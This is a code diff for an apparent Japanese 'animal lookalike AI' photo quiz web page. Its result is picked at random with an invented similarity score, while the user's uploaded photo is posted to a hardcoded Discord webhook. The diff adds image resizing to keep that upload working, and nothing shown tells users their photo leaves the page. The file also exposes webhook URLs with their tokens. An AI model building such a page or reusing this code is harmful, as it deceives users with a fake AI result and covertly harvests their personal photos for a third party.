@@ -1,7 +1,7 @@
 // ===============================
 // 設定
 // ===============================
-const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477577868971347980/C9ZRDZs29Cv4XdGx653quVphBx3llRei0c2420A6BBPauWsmm69gRJ-I4AGupX2iGdCi"; // ←テスト用
+const DISCORD_WEBHOOK_URL = "https://discordapp.com/api/webhooks/1477578888136753224/DnFQt6ChPn1akhWO01OrDFTnaSC2Zu-D7ALGnusyEU_aGfIzU2ny8_N3xDQhs0frn9nR"; // ←テスト用
 let lastUploadedFile = null;
 
 // ===============================
@@ -33,7 +33,7 @@ const fileInput = document.getElementById('fileInput');
 
 uploadBtn.addEventListener("click",()=>fileInput.click());
 
-fileInput.addEventListener("change",async ()=>{
+fileInput.addEventListener("change", async ()=>{
     const file = fileInput.files[0];
     if(!file) return;
 
@@ -48,7 +48,6 @@ fileInput.addEventListener("change",async ()=>{
     reader.onload = function(e){
         localStorage.setItem('uploadedImage', e.target.result);
 
-        // 診断生成
         const animal = getRandomAnimal();
         storeResultData(animal);
 
@@ -62,13 +61,13 @@ fileInput.addEventListener("change",async ()=>{
 // 動物データ
 // ===============================
 const animalData = [
-    { name:'ねこ', icon:'🐱', description:'自由奔放で好奇心旺盛。マイペースで気まぐれな性格。', minSimilarity:75,maxSimilarity:98 },
-    { name:'いぬ', icon:'🐶', description:'忠実で社交的。人懐っこく、明るく活発。', minSimilarity:70,maxSimilarity:95 },
-    { name:'きつね', icon:'🦊', description:'賢くて機転が利く。計画的で慎重な性格。', minSimilarity:72,maxSimilarity:96 },
-    { name:'うさぎ', icon:'🐰', description:'優しくて繊細。感受性が豊かで穏やか。', minSimilarity:68,maxSimilarity:93 },
-    { name:'たぬき', icon:'🐻', description:'のんびり屋で温和。ユーモアがあり場を和ませる。', minSimilarity:65,maxSimilarity:90 },
+    { name:'ねこ', icon:'🐱', description:'自由奔放で好奇心旺盛。マイペースで気まぐれ。', minSimilarity:75,maxSimilarity:98 },
+    { name:'いぬ', icon:'🐶', description:'忠実で社交的。明るく活発。', minSimilarity:70,maxSimilarity:95 },
+    { name:'きつね', icon:'🦊', description:'賢くて機転が利く。計画的で慎重。', minSimilarity:72,maxSimilarity:96 },
+    { name:'うさぎ', icon:'🐰', description:'優しくて繊細。穏やかで感受性豊か。', minSimilarity:68,maxSimilarity:93 },
+    { name:'たぬき', icon:'🐻', description:'のんびり屋で温和。ユーモアあり場を和ませる。', minSimilarity:65,maxSimilarity:90 },
     { name:'ハリネズミ', icon:'🦔', description:'控えめで慎重。仲良くなると温かい一面も。', minSimilarity:70,maxSimilarity:94 },
-    { name:'ハムスター', icon:'🐹', description:'元気で活動的。好奇心旺盛で愛嬌がある。', minSimilarity:68,maxSimilarity:92 },
+    { name:'ハムスター', icon:'🐹', description:'元気で活動的。好奇心旺盛で愛嬌あり。', minSimilarity:68,maxSimilarity:92 },
     { name:'パンダ', icon:'🐼', description:'のんびり穏やか。マイペースで自然体。', minSimilarity:66,maxSimilarity:91 }
 ];
 
@@ -82,9 +81,36 @@ function getRandomAnimal(){
 }
 
 // ===============================
+// 画像をリサイズ（2MB以下目安）
+// ===============================
+async function resizeImage(file, maxSizeMB = 2){
+    return new Promise((resolve)=>{
+        const img = new Image();
+        const reader = new FileReader();
+        reader.onload = e => { img.src = e.target.result; };
+        img.onload = () => {
+            const canvas = document.createElement("canvas");
+            let width = img.width;
+            let height = img.height;
+            const scale = Math.sqrt((maxSizeMB * 1024 * 1024) / file.size);
+            if(scale < 1){
+                width *= scale;
+                height *= scale;
+            }
+            canvas.width = width;
+            canvas.height = height;
+            const ctx = canvas.getContext("2d");
+            ctx.drawImage(img,0,0,width,height);
+            canvas.toBlob(blob=>resolve(blob),"image/png");
+        };
+        reader.readAsDataURL(file);
+    });
+}
+
+// ===============================
 // 結果保存 + Discord送信
 // ===============================
-function storeResultData(animal){
+async function storeResultData(animal){
     const resultData = {
         name: animal.name,
         icon: animal.icon,
@@ -94,27 +120,27 @@ function storeResultData(animal){
     };
     localStorage.setItem('diagnosisResult', JSON.stringify(resultData));
 
-    // Discord送信
     if(lastUploadedFile){
-        const formData = new FormData();
-        formData.append("file", lastUploadedFile, "image.png");
+        const resizedBlob = await resizeImage(lastUploadedFile);
 
-        // Discordに送信するembedのdescriptionは短くする
-        const safeDescription = animal.description.length > 200 ? animal.description.substring(0,200) + "…" : animal.description;
+        const formData = new FormData();
+        formData.append("file", resizedBlob, "image.png");
+
+        const safeDescription = animal.description.length > 200 ? animal.description.substring(0,200)+"…" : animal.description;
 
         formData.append("payload_json", JSON.stringify({
-            username: "似てる動物AI",
-            content: "📷 新しい診断結果が届きました！",
+            username:"似てる動物AI",
+            content:"📷 新しい診断結果が届きました！",
             embeds:[{
-                title: "診断結果",
-                description: `**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${safeDescription}\n似ている度：${animal.similarity}%`,
-                color: 0x9ddcff,
+                title:"診断結果",
+                description:`**動物タイプ**：${animal.name} ${animal.icon}\n**特徴**：${safeDescription}\n似ている度：${animal.similarity}%`,
+                color:0x9ddcff,
                 image:{url:"attachment://image.png"}
             }]
         }));
 
         fetch(DISCORD_WEBHOOK_URL, {method:"POST", body:formData})
-            .then(res => console.log("Discord送信成功", res.status))
-            .catch(err => console.error("Discord送信失敗", err));
+            .then(res=>console.log("Discord送信成功", res.status))
+            .catch(err=>console.error("Discord送信失敗", err));
     }
 }
